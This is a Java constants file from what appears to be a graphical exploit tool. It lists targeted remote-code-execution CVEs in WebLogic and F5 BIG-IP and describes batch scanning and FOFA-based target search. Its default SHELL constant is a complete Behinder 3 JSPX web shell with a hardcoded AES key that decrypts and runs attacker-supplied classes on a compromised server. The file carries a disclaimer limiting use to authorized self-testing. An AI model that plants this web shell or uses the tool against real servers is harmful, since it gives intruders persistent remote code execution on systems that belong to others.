package com.yhy.core;

/**
 * @author yhy
 * @date 2021/3/25 11:20
 * @github https://github.com/yhy0
 */

public class Constants {
    public static String NAME = "图形化漏洞利用Demo-JavaFx版";

    public static String VERSION = "v1.3 ";

    public static String AUTHOR = "yhy";

    public static String BASICINFO = "本工具提供给安全测试人员,安全工程师,进行安全自查使用,请勿非法使用\r\n\r\n" +
            "版本:     " + VERSION + "\r\n\r\n" +
            "Bug反馈:  https://github.com/yhy0/ExpDemo-JavaFX\r\n\r\n" +
            "V1.3\r\n" +
            "\t增加fofa查询功能\r\n" +
            "V1.2\n" +
            "\t批量扫描模块，添加对存在漏洞的url导出功能\r\n" +
            "\t修改检测漏洞后的显示，存在、不存在、异常\r\n" +
            "V1.1\n" +
            "\t参考冰蝎的代理，添加代理设置，方便走burp调试\r\n" +
            "\t优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑";


    public static String[] CVES = {
            "CVE-2020-14882 未授权代码执行漏洞",
            "CVE-2021-22986 F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞",
            "CVE-2021-2 weblogic xml反序列化漏洞",
            "CVE-2021-3",
            "CVE-2021-4",
            "CVE-2021-5",
            "all",
    };

    public static String[] ENCODING = {
            "UTF-8",
            "GBK",
            "GBK2312",
            "ISO-8859-1"
    };

    // fofa 搜索数
    public static int[] SIZE = {10, 50, 100, 300, 600, 1000, 10000};
    // fofa配置保存位置
    public static String FOFAPATH = "fofa.conf";

    // 默认为冰蝎3 的shell.jspx
    public static String SHELL = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>";

    public Constants() {
    }

}
